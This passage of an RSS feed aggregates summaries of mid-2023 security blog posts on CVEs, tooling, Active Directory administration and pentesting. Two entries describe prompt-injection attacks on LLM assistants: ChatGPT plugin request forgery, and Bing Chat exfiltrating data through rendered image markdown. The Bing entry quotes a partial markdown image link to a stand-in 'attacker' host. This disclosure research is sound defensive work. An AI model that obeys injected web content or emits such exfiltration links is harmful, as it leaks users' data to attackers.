        <summary type="html"><![CDATA[On January 21, 2023 at ShmooCon 2023, Praetorian open-sourced Gato (Github Attack Toolkit), a first of its kind tool that focuses on abusing offensive TTPs targeting self-hosted GitHub Actions Runners. Since then, Praetorian and other offensive security practitioners across the information security community have leveraged Gato for so much more than just self-hosted runner attacks. […]
The post Announcing Gato Version 1.5! appeared first on Praetorian.]]></summary>
        <author>
            <name>Emmaline</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Location-based printing for Active Directory sites]]></title>
        <id>https://4sysops.com/?p=1572251</id>
        <link href="https://4sysops.com/archives/location-based-printing-for-active-directory-sites/"/>
        <updated>2023-06-26T21:03:00.000Z</updated>
        <summary type="html"><![CDATA[With a modern hybrid workforce, admins must take a user's location into account when configuring printing solutions. Location-based printing can be controlled using Group Policy and the Print Management GUI.
Location-based printing for Active Directory sites first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[LABScon Replay | Quiver – Using Cutting Edge ML to Detect Interesting Command Lines for Hunters]]></title>
        <id>https://www.sentinelone.com/?post_type=labs&amp;p=81995</id>
        <link href="https://www.sentinelone.com/labs/labscon-replay-quiver-using-cutting-edge-ml-to-detect-interesting-command-lines-for-hunters/"/>
        <updated>2023-06-26T13:16:34.000Z</updated>
        <summary type="html"><![CDATA[Gal Braun and Dean Langsam explore how LLMs can be trained to parse command lines and perform tasks like attribution and detection.]]></summary>
        <author>
            <name>LABScon</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Exploiting Noisy Oracles with Bayesian Inference]]></title>
        <id>https://research.nccgroup.com/?p=31496</id>
        <link href="https://research.nccgroup.com/2023/06/23/exploiting-noisy-oracles-with-bayesian-inference/"/>
        <updated>2023-06-23T20:05:18.000Z</updated>
        <summary type="html"><![CDATA[In cryptographic attacks, we often rely on abstracted information sources which we call “oracles”. Classic examples include the RSA parity oracle attack, which depends on an oracle disclosing the least-significant bit of a ciphertext’s decryption; Bleichenbacher’s attack on PKCS#1v1.5 RSA padding, which depends on an oracle for whether a given ciphertext’s decryption is correctly padded; […]]]></summary>
        <author>
            <name>Eli Sohl</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Create a Kubernetes Pod]]></title>
        <id>https://4sysops.com/?p=1572239</id>
        <link href="https://4sysops.com/archives/create-a-kubernetes-pod/"/>
        <updated>2023-06-23T15:57:46.000Z</updated>
        <summary type="html"><![CDATA[In Kubernetes, a Pod is the smallest and most basic deployment unit that you create and manage in a cluster. The Pod contains one or more containers, storage resources, a unique network IP address, and other configuration options.
Create a Kubernetes Pod first appeared on 4sysops.]]></summary>
        <author>
            <name>Surender Kumar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A Visual Summary of SANS Ransomware Summit 2023]]></title>
        <id>https://www.sans.org/blog/a-visual-summary-of-sans-ransomware-summit-2023</id>
        <link href="https://www.sans.org/blog/a-visual-summary-of-sans-ransomware-summit-2023?msc=rss"/>
        <updated>2023-06-23T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[SANS Cybersecurity Blog pertaining to a summary of the SANS Ransomware Summit 2023]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cybersecurity Jobs: Vulnerability Researcher & Exploit Developer (Japanese)]]></title>
        <id>https://www.sans.org/blog/cybersecurity-jobs-vulnerability-researcher-exploit-developer-ja</id>
        <link href="https://www.sans.org/blog/cybersecurity-jobs-vulnerability-researcher-exploit-developer-ja?msc=rss"/>
        <updated>2023-06-23T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[脆弱性研究者・エクスプロイト開発者の主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The myth of “knowing your org” -> know_your_org.docx]]></title>
        <id>https://www.hexacorn.com/blog/?p=8616</id>
        <link href="https://www.hexacorn.com/blog/2023/06/22/the-myth-of-knowing-your-org-know_your_org-docx/"/>
        <updated>2023-06-22T23:54:19.000Z</updated>
        <summary type="html"><![CDATA[The cyber consulting world delivers a lot of useful security work. They do workshops, trainings, table top exercises, they write playbooks, red team, provide assessments, and help companies with gap […]]]></summary>
        <author>
            <name>adam</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[What is Tier Zero — Part 1]]></title>
        <id>https://medium.com/p/e0da9b7cdfca</id>
        <link href="https://posts.specterops.io/what-is-tier-zero-part-1-e0da9b7cdfca?source=rss----f05f8696e3cc---4"/>
        <updated>2023-06-22T19:26:35.000Z</updated>
        <summary type="html"><![CDATA[Tier Zero is a crucial group of assets in Active Directory (AD) and Azure. Its purpose is to protect the most critical components by…]]></summary>
        <author>
            <name>Jonas Bülow Knudsen</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Disable IPv6 in Windows]]></title>
        <id>https://4sysops.com/?p=1572219</id>
        <link href="https://4sysops.com/archives/disable-ipv6-in-windows/"/>
        <updated>2023-06-22T17:59:57.000Z</updated>
        <summary type="html"><![CDATA[In newer versions of Windows, IPv6 is installed by default and enabled on all network adapters. However, in smaller environments, there is often a lack of expertise to properly configure and maintain the IPv6 infrastructure. In such cases, admins might want to disable IPv6.
Disable IPv6 in Windows first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2022-31696: An Analysis of a VMware ESXi TCP Socket Keepalive Type Confusion LPE]]></title>
        <id>5894c269e4fcb5e65a1ed623:58a5b38cb3db2bd67b608658:64938e2e4512d44c73bc3eab</id>
        <link href="https://www.thezdi.com/blog/2023/6/21/cve-2022-31696-an-analysis-of-a-vmware-esxi-tcp-socket-keepalive-type-confusion-lpe"/>
        <updated>2023-06-22T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[Last year we published our patch gap analysis of ESXi’s TCP/IP stack, which is forked from FreeBSD 8.2. While our focus was mainly on missing FreeBSD patches in ESXi, we also came across a type confusion bug in code introduced by VMware. This blog post details a vulnerability I discovered in ESXi’s implementation of the setsockopt system call that could lead to a sandbox escape. The vulnerability was assigned CVE-2022-31696 and disclosed as part of the advisory VMSA-2022-003. Additionally, I also explore ESXi’s kernel heap allocator and weaknesses in existing kernel mitigations. 
For information regarding the initial analysis of the TCP/IP kernel module, VMkernel debug symbols, and porting type information from FreeBSD to ESXi, it is recommend to read our earlier analysis. 
Comparing setso…]]></summary>
        <author>
            <name>Reno Robert</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A Cool New Project: Semgrep Rules for Android Apps Security]]></title>
        <id>https://blog.mindedsecurity.com/2023/06/a-cool-new-project-semgrep-rules-for.html</id>
        <link href="https://blog.mindedsecurity.com/2023/06/a-cool-new-project-semgrep-rules-for.html"/>
        <updated>2023-06-21T15:04:00.017Z</updated>
        <summary type="html"><![CDATA[In today's digital landscape, mobile application security has become an paramount concern. 
With the increasing number of threats targeting Android applications and the stored personal data, developers and security professionals alike are seeking robust solutions to fortify their code against potential vulnerabilities. 
That's why speeding up the time and minimizing the effort in the identification of mobile security issues has become definitely important.
We are excited to introduce our new project, focused on creating Semgrep rules specifically designed to enhance the security of Android apps.
Semgrep Rules for Android Application Security
The project provides a new set of specific rules for OWASP Mobile Security Testing Guide (MSTG), that will help to find security issues using static c…]]></summary>
        <author>
            <name>IMQ Minded Security Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Reasons DCPROMO failed]]></title>
        <id>https://4sysops.com/?p=1572207</id>
        <link href="https://4sysops.com/archives/reasons-dcpromo-failed/"/>
        <updated>2023-06-21T14:00:29.000Z</updated>
        <summary type="html"><![CDATA[DCPROMO is a command line tool in Windows Server that is used to promote an Active Directory member server to a domain controller or demote a domain controller to a member server or standalone server. Let's explore why DCPROMO may have failed and consider effective solutions.
Reasons DCPROMO failed first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Automating String Decryption and Other Reverse Engineering Tasks in radare2 With r2pipe]]></title>
        <id>https://www.sentinelone.com/?post_type=labs&amp;p=81859</id>
        <link href="https://www.sentinelone.com/labs/automating-string-decryption-and-other-reverse-engineering-tasks-in-radare2-with-r2pipe/"/>
        <updated>2023-06-21T13:52:53.000Z</updated>
        <summary type="html"><![CDATA[Learn how to drive radare2 with r2pipe for automated binary analysis, string decryption and other common reversing tasks.]]></summary>
        <author>
            <name>Phil Stokes</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2023-27997 Vulnerability Scanner for FortiGate Firewalls]]></title>
        <id>https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate</id>
        <link href="https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate"/>
        <updated>2023-06-20T21:00:00.000Z</updated>
        <summary type="html"><![CDATA[Use our latest vulnerability assessment tool to check for CVE-2023-27997, a vulnerability in FortiGate firewalls.]]></summary>
        <author>
            <name>Caleb Gross</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Migrating GPOs to MDM with Intune’s Group Policy Analytics]]></title>
        <id>https://4sysops.com/?p=1572187</id>
        <link href="https://4sysops.com/archives/migrating-gpos-to-mdm-with-intunes-group-policy-analytics/"/>
        <updated>2023-06-20T17:52:35.000Z</updated>
        <summary type="html"><![CDATA[Microsoft's modern management is based on cloud services, such as Autopilot, Azure Active Directory, and Intune. The latter uses Windows' Mobile Device Management interfaces instead of Group Policy to centrally manage PCs. Microsoft introduced a Group Policy Analytics tool in Intune to help migrate on-premises GPOs to policies for the Configuration Service Provider (CSP).
Migrating GPOs to MDM with Intune’s Group Policy Analytics first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Plugin Vulnerabilities: Visit a Website and Have Your Source Code Stolen]]></title>
        <id>https://embracethered.com/blog/posts/2023/chatgpt-plugin-vulns-chat-with-code/</id>
        <link href="https://embracethered.com/blog/posts/2023/chatgpt-plugin-vulns-chat-with-code/"/>
        <updated>2023-06-20T15:00:22.000Z</updated>
        <summary type="html"><![CDATA[OpenAI continues to add plugins with security vulnerabilities to their store.
In particular powerful plugins that can impersonate a user are not getting the required security scrutiny, or a general mitigation at the platform level.
As a brief reminder, one of the challenges Large Language Model (LLM) User-Agents, like ChatGPT, and plugins face is the Confused Deputy Problem / Plugin Request Forgery Attacks, which means that during a Prompt Injection attack an adversary can issue commands to plugins to cause harm.]]></summary>
        <author>
            <name>Embrace The Red</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Keep it simple, Scanner]]></title>
        <id>keep-it-simple-scanner</id>
        <link href="https://portswigger.net/blog/keep-it-simple-scanner"/>
        <updated>2023-06-20T14:02:00.000Z</updated>
        <summary type="html"><![CDATA[There’s a running joke on the scanner development team; for the longest time I had net negative lines of code added to the Burp Suite codebase, and everyone’s convinced that I’m trying to regain that]]></summary>
        <author>
            <name>PortSwigger Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[TaskCafe, Version 0.3.2 Advisory]]></title>
        <id>https://bishopfox.com/blog/taskcafe-version-0-3-2-advisory</id>
        <link href="https://bishopfox.com/blog/taskcafe-version-0-3-2-advisory"/>
        <updated>2023-06-20T14:00:00.000Z</updated>
        <summary type="html"><![CDATA[Learn about three vulnerabilities we discovered in TaskCafe Version 0.3.2 that result in improper access controls, stored cross-site scripting, and insecure file upload.]]></summary>
        <author>
            <name>Joan Bono, Luis De la Rosa Hernandez</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[fwd:cloudsec 2023: Top Four Themes in Cloud Security for 2023]]></title>
        <id>https://www.praetorian.com/?p=4729</id>
        <link href="https://www.praetorian.com/blog/fwdcloudsec-2023-top-four-themes/"/>
        <updated>2023-06-20T13:03:13.000Z</updated>
        <summary type="html"><![CDATA[At Praetorian, we pride ourselves on our extensive expertise in cloud security and our commitment to staying at the forefront of the ever-evolving landscape. We consequently were excited to attend the highly anticipated fwd:cloudsec 2023 conference held on June 12–13, in Anaheim, CA. This non-profit conference brings together cloud security professionals, researchers, and practitioners from […]
The post fwd:cloudsec 2023: Top Four Themes in Cloud Security for 2023 appeared first on Praetorian.]]></summary>
        <author>
            <name>Emmaline</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[SQL Server Always Encrypted]]></title>
        <id>https://4sysops.com/?p=1572165</id>
        <link href="https://4sysops.com/archives/sql-server-always-encrypted/"/>
        <updated>2023-06-19T15:10:47.000Z</updated>
        <summary type="html"><![CDATA[Microsoft SQL Server Always Encrypted is a feature that protects confidential data by encrypting it at the column level. It helps prevent accidental or fraudulent disclosure of sensitive data, such as social security numbers (SSN), credit card numbers, or personal health information. In this post, we will discuss Always Encrypted in SQL Server and how to use it.
SQL Server Always Encrypted first appeared on 4sysops.]]></summary>
        <author>
            <name>Surender Kumar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bing Chat: Data Exfiltration Exploit Explained]]></title>
        <id>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</id>
        <link href="https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/"/>
        <updated>2023-06-18T07:01:02.000Z</updated>
        <summary type="html"><![CDATA[This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.
The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.
Imagine the LLM returns the following text:
![data exfiltration in progress](https://attacker/logo.]]></summary>
        <author>
            <name>Embrace The Red</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Update: zipdump.py Version 0.0.26]]></title>
        <id>http://blog.didierstevens.com/?p=10080</id>
        <link href="https://blog.didierstevens.com/2023/06/17/update-zipdump-py-version-0-0-26/"/>
        <updated>2023-06-17T11:45:23.000Z</updated>
        <summary type="html"><![CDATA[In this new version, new features/updates are: zipdump_v0_0_26.zip (http)MD5: 5F6C82CD17D587D201D59A4B535F3702SHA256: 90D0F0C1FA238DA9FBC6B7100B8EC01B0E155A0BBF22613B2BA22D5190ABF4DF]]></summary>
        <author>
            <name>Didier Stevens</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2023-34367]]></title>
        <id>http://blog.pi3.com.pl/?p=1003</id>
        <link href="http://blog.pi3.com.pl/?p=1003"/>
        <updated>2023-06-16T20:25:10.000Z</updated>
        <summary type="html"><![CDATA[Blind TCP/IP hijacking is still alive! After 13 years, Windows 7/XP/2K/9x (and not only) full blind TCP/IP hijacking bug finally got an allocated CVE-2023-34367 (thanks to MITRE). Interestingly, The Pwnie Awards nomination for this research and the published write-up + PoC didn’t help to get it sooner 😉 More information about that bug I described in my […]]]></summary>
        <author>
            <name>pi3</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Clone Proxmox VMs with Terraform]]></title>
        <id>https://4sysops.com/?p=1572142</id>
        <link href="https://4sysops.com/archives/clone-proxmox-vms-with-terraform/"/>
        <updated>2023-06-16T19:17:37.000Z</updated>
        <summary type="html"><![CDATA[With the help of Terraform's IaC solution, you can easily clone Proxmox VMs. In this post, you'll learn about the Terraform Proxmox provider, how to generate an API token, how to create the Terraform files, and finally, how to clone VMs.
Clone Proxmox VMs with Terraform first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Trail of Bits’s Response to NTIA AI Accountability RFC]]></title>
        <id>https://blog.trailofbits.com/?p=104608</id>
        <link href="https://blog.trailofbits.com/2023/06/16/trail-of-bitss-response-to-ntia-ai-accountability-rfc/"/>
        <updated>2023-06-16T12:00:10.000Z</updated>
        <summary type="html"><![CDATA[By Heidy Khlaaf and Artem Dinaburg The National Telecommunications and Information Administration (NTIA) has circulated an Artificial Intelligence (AI) Accountability Policy Request for Comment on what policies can support the development of AI audits, assessments, certifications, and other mechanisms to create earned trust in AI systems. Trail of Bits has submitted a response to the […]]]></summary>
        <author>
            <name>Trail of Bits</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[New Sources of Microsoft Office Metadata – Tool Release MetadataPlus]]></title>
        <id>https://research.nccgroup.com/?p=30141</id>
        <link href="https://research.nccgroup.com/2023/06/16/new-sources-of-microsoft-office-metadata-tool-release-metadataplus/"/>
        <updated>2023-06-16T00:57:55.000Z</updated>
        <summary type="html"><![CDATA[TL;DR – 31 usernames extracted vs 13 from the next leading brand! Introduction Open Source Intelligence Gathering (OSINT) can be an activity in itself and can also form a solid foundation for Full Spectrum Attack Simulations. Getting an idea of username formats as well as a number of known usernames increases the chances of success […]]]></summary>
        <author>
            <name>cnevncc</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cybersecurity Jobs: Security Awareness Officer (Japanese)]]></title>
        <id>https://www.sans.org/blog/cybersecurity-jobs-security-awareness-officer-ja</id>
        <link href="https://www.sans.org/blog/cybersecurity-jobs-security-awareness-officer-ja?msc=rss"/>
        <updated>2023-06-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[セキュリティアウェアネスオフィサーの主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Change the owner of computer objects in Active Directory]]></title>
        <id>https://4sysops.com/?p=1572126</id>
        <link href="https://4sysops.com/archives/change-the-owner-of-computer-objects-in-active-directory/"/>
        <updated>2023-06-15T17:18:26.000Z</updated>
        <summary type="html"><![CDATA[When a user joins a computer to an AD domain, they automatically become the owner of the corresponding AD object. This is why standard users should not have the domain join permission. If they still own computer objects, it is recommended for security reasons to replace them with a service account.
Change the owner of computer objects in Active Directory first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Finding bugs in C code with Multi-Level IR and VAST]]></title>
        <id>https://blog.trailofbits.com/?p=104592</id>
        <link href="https://blog.trailofbits.com/2023/06/15/finding-bugs-with-mlir-and-vast/"/>
        <updated>2023-06-15T11:00:10.000Z</updated>
        <summary type="html"><![CDATA[Intermediate languages (IRs) are what reverse engineers and vulnerability researchers use to see the forest for the trees. IRs are used to view programs at different abstraction layers, so that analysis can understand both low-level code aberrations and higher levels of flawed logic mistakes. The setback is that bug-finding tools are often pigeonholed into choosing […]]]></summary>
        <author>
            <name>Trail of Bits</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Overview of Content Published in May]]></title>
        <id>http://blog.didierstevens.com/?p=10077</id>
        <link href="https://blog.didierstevens.com/2023/06/15/overview-of-content-published-in-may-8/"/>
        <updated>2023-06-15T07:56:23.000Z</updated>
        <summary type="html"><![CDATA[Here is an overview of content I published in May: Blog posts: Update: oledump.py Version 0.0.75 SANS ISC Diary entries: VBA Project References Quickly Finding Encoded Payloads in Office Documents Another Malicious HTA File Analysis – Part 3 Wireshark 4.0.6 Released Analyzing Office Documents Embedded Inside PPT (PowerPoint) Files]]></summary>
        <author>
            <name>Didier Stevens</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mitre Att&ck – from JSON to CSV]]></title>
        <id>https://www.hexacorn.com/blog/?p=8591</id>
        <link href="https://www.hexacorn.com/blog/2023/06/14/mitre-attck-from-json-to-csv/"/>
        <updated>2023-06-14T23:21:58.000Z</updated>
        <summary type="html"><![CDATA[I love JSON-formatted data so much that… anytime I see something valuable stored in this format I really can’t resist the temptation of converting it to CSV so that I […]]]></summary>
        <author>
            <name>adam</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Spectre: A password manager that doesn’t store passwords]]></title>
        <id>https://4sysops.com/?p=1572115</id>
        <link href="https://4sysops.com/archives/spectre-a-password-manager-that-doesnt-store-passwords/"/>
        <updated>2023-06-14T18:08:12.000Z</updated>
        <summary type="html"><![CDATA[Password managers are not without security flaws, as seen in a recent high-profile breach. The database storing all the user's passwords is a very attractive target for hackers. Spectre is a new password manager that aims to solve this problem by using a unique password generation and management approach.
Spectre: A password manager that doesn’t store passwords first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Grammarly CISO Suha Can Discusses the Impact of Preemptive Security with HackerOne]]></title>
        <id>https://hackerone.com/customer-stories/grammarly-ciso-suha-can-discusses-preemptive-security</id>
        <link href="https://www.hackerone.com/customer-stories/grammarly-ciso-suha-can-discusses-preemptive-security"/>
        <updated>2023-06-14T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[Suha Can, the CISO of Grammarly, recently joined HackerOne’s CTO & Co-founder, Alex Rice, for a discussion on user trust, the benefits of Grammarly’s bug bounty program, and the advantages of preemptive security measures.]]></summary>
        <author>
            <name>ktansley@hackerone.com</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How I choose a security research topic]]></title>
        <id>how-i-choose-a-security-research-topic</id>
        <link href="https://portswigger.net/research/how-i-choose-a-security-research-topic"/>
        <updated>2023-06-14T13:09:35.000Z</updated>
        <summary type="html"><![CDATA[How do you choose what topic to research? That’s the single most common question I get asked, probably because selecting a topic is such a daunting prospect. In this post, I’ll take a personal look at]]></summary>
        <author>
            <name>PortSwigger Research</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Improving Performance and Scalability: Updates and Lessons from Inspector, Our End-to-End Testing Solution]]></title>
        <id>https://www.praetorian.com/?p=4720</id>
        <link href="https://www.praetorian.com/blog/inspector-updates/"/>
        <updated>2023-06-14T13:05:57.000Z</updated>
        <summary type="html"><![CDATA[Overview In a previous article titled Inspector or: How I Learned to Stop Worrying and Love Testing in Prod, we discussed our end-to-end testing solution, Inspector, which we leverage to perform continuous testing of our external attack surface enumeration scanning system. Here, we discuss some of the recent modifications and updates we made to Inspector […]
The post Improving Performance and Scalability: Updates and Lessons from Inspector, Our End-to-End Testing Solution appeared first on Praetorian.]]></summary>
        <author>
            <name>Emmaline</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Architecting An Offensive Security Blueprint: 2023 Insights From the Ponemon Institute]]></title>
        <id>https://bishopfox.com/blog/architecting-offensive-security-blueprint</id>
        <link href="https://bishopfox.com/blog/architecting-offensive-security-blueprint"/>
        <updated>2023-06-14T11:00:00.000Z</updated>
        <summary type="html"><![CDATA[Learn how mature organizations are designing offensive security blueprints to defend forward against today's most advanced adversaries and threats.]]></summary>
        <author>
            <name>Tom Eston</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Setting up a secure FTP server (FTPS) on Windows]]></title>
        <id>https://4sysops.com/?p=1572105</id>
        <link href="https://4sysops.com/archives/setting-up-a-secure-ftp-server-ftps-on-windows/"/>
        <updated>2023-06-13T20:27:23.000Z</updated>
        <summary type="html"><![CDATA[In addition to the web server, Internet Information Services (IIS) contain an FTP server. It is integrated with the Windows user and authorization management and creates the necessary firewall rules during its installation. For secure transfer, it supports FTP over TLS/SSL (FTPS), but not the SSH-based SFTP.
Setting up a secure FTP server (FTPS) on Windows first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The June 2023 Security Update Review]]></title>
        <id>5894c269e4fcb5e65a1ed623:58a5b38cb3db2bd67b608658:648893950d553d2580382c39</id>
        <link href="https://www.thezdi.com/blog/2023/6/13/the-june-2023-security-update-review"/>
        <updated>2023-06-13T17:28:34.000Z</updated>
        <summary type="html"><![CDATA[It’s the second Tuesday of the month, which means Adobe and Microsoft have released their latest security patches. Take a break from your regularly scheduled activities and join us as we review the details of their latest advisories. If you’d rather watch the video recap, check out the Patch Report webcast on our YouTube channel.
Adobe Patches for June 2023
For June, Adobe released four patches addressing 18 CVEs in Adobe Commerce, Substance 3D Designer, Adobe Animate, and Experience Manager. The bug in Substance 3D Designer was found by ZDI researcher Mat Powell and could lead to arbitrary code execution when opening a specially crafted file. The patch for Commerce is the largest this month with a dozen total fixes. Most of these are Important or Moderate rated Security Feature Bypasses (…]]></summary>
        <author>
            <name>Dustin Childs</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Introducing Cloudfoxable: A Gamified Cloud Hacking Sandbox]]></title>
        <id>https://bishopfox.com/blog/cloudfoxable-gamified-cloud-hacking-sandbox</id>
        <link href="https://bishopfox.com/blog/cloudfoxable-gamified-cloud-hacking-sandbox"/>
        <updated>2023-06-13T14:00:00.000Z</updated>
        <summary type="html"><![CDATA[Introducing CloudFoxable, an intentionally vulnerable AWS environment created specifically to teach the art of AWS cloud penetration testing, while highlighting CloudFox to help find latent attack paths more effectively.]]></summary>
        <author>
            <name>Seth Art</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dynamic Linq Injection Remote Code Execution Vulnerability (CVE-2023-32571)]]></title>
        <id>https://research.nccgroup.com/?p=30533</id>
        <link href="https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/"/>
        <updated>2023-06-13T13:27:46.000Z</updated>
        <summary type="html"><![CDATA[Product Details Name System.Linq.Dynamic.Core Affected versions 1.0.7.10 to 1.2.25 Fixed versions >= 1.3.0 URL https://www.dynamic-linq.net/ Vulnerability Summary CVE CVE-2023-32571 CWE CWE-184: Incomplete List of Disallowed Inputs CVSSv3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N CVSSv3.1 base score 9.1 Overview What is Dynamic Linq? Dynamic Linq is an open source .NET library that allows developers to easily incorporate flexible data filtering […]]]></summary>
        <author>
            <name>Ross Bradley</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Protecting Critical Infrastructure: A Tale of Two National Cybersecurity Strategies]]></title>
        <id>https://www.synack.com/?p=16110</id>
        <link href="https://www.synack.com/blog/critical-infrastructure-national-cybersecurity-strategies/"/>
        <updated>2023-04-06T15:17:37.000Z</updated>
        <summary type="html"><![CDATA[The term “special relationship,” coined by Winston Churchill, describes the close, longstanding alliance between the United States and the United Kingdom. It has been applied to cooperation during war, to trade and commerce, and even to intelligence sharing. That special relationship has clearly influenced the two nations’ recent policy papers on national cybersecurity. The U.K. […]
The post Protecting Critical Infrastructure: A Tale of Two National Cybersecurity Strategies appeared first on Synack.]]></summary>
        <author>
            <name>Luke Luckett</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Scoping Adventures: How to Get the Most Out of Your Synack Pentesting]]></title>
        <id>https://www.synack.com/?p=16093</id>
        <link href="https://www.synack.com/blog/scoping-your-pentest-with-synack/"/>
        <updated>2023-03-27T14:46:36.000Z</updated>
        <summary type="html"><![CDATA[Scoping Adventures is a series of blogs about some of the more interesting penetration tests that the Synack Customer Success teams have worked on over the last few months. Each blog outlines how we engage with the client to achieve the best results from a pentest. Pentesters love colors—red, blue, purple, black, white and grey […]
The post Scoping Adventures: How to Get the Most Out of Your Synack Pentesting appeared first on Synack.]]></summary>
        <author>
            <name>Huw Jones</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Applying Strategic Thinking in Your Pentesting Program]]></title>
        <id>https://www.synack.com/?p=16082</id>
        <link href="https://www.synack.com/blog/applying-strategic-thinking-in-your-pentesting-program/"/>
        <updated>2023-03-15T11:00:36.000Z</updated>
        <summary type="html"><![CDATA[The Synack Platform & Five Pillars of Strategic Pentesting Why You Need to Think Strategically It’s no great revelation that tactics, techniques, and procedures utilized by nefarious hackers hacking activities are evolving on a daily basis. In 2022, 18,828 common vulnerabilities and exposures (CVEs) were published. At the same time, organization attack surfaces are expanding. […]
The post Applying Strategic Thinking in Your Pentesting Program appeared first on Synack.]]></summary>
        <author>
            <name>Synack</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The U.S. has a new cybersecurity strategy. What’s next for CISOs?]]></title>
        <id>https://www.synack.com/?p=16074</id>
        <link href="https://www.synack.com/blog/new-cybersecurity-strategy-whats-next-for-cisos/"/>
        <updated>2023-03-13T14:37:20.000Z</updated>
        <summary type="html"><![CDATA[One week ago, the Biden administration unveiled its long-awaited U.S. National Cybersecurity Strategy, with an eye toward centralizing government cyber resources and holding IT vendors more accountable for their digital defenses. Now that the ink is dry on the 35-page document, top officials like Acting National Cyber Director Kemba Walden are busy putting it into […]
The post The U.S. has a new cybersecurity strategy. What’s next for CISOs? appeared first on Synack.]]></summary>
        <author>
            <name>Mark Kuhr</name>
        </author>
    </entry>
</feed>